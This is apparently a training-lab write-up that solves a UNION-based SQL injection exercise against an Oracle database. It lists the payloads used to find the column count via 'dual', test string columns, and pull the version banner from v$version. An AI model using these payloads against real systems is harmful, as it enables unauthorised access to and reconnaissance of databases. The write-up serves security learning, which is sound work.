# Lab 7 - SQL injection attack, querying the database type and version on Oracle

**Status**: Solved on August 2, 2023.

**Objective**: Display the database version string.

## Solving Process

- First, the number of columns has to be determined, but the usual payload returned an internal server error:
  - `' UNION SELECT NULL,NULL--`
- The error generated because an Oracle Database requires to use `FROM` together with `SELECT`. The `dual` table from Oracle can be used for this purpose. So the payload is modified to have a correct syntax for Oracle, as follows:
  - `' UNION SELECT NULL,NULL FROM dual--`
  - The payload returned *no errors*, thus confirming that we're dealing with an Oracle DB
- Since the last payload returned a 200 OK response, it means the original query returns 2 columns. The next step is to check which ones support strings data types:
  - `' UNION SELECT 'abc','abc' FROM dual--` returns a 200 OK response, so both columns accept strings
- Now that we know that the query has 2 columns and that both accept strings, we can built a payload to get the Oracle database version. From the SQL Cheatsheet, the version is stored in the `banner` column from the `v$version` table:
  - `' UNION SELECT banner, NULL FROM v$version--`
- The payload was successful, and the database version is included within the response's HTML
  - `Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production`
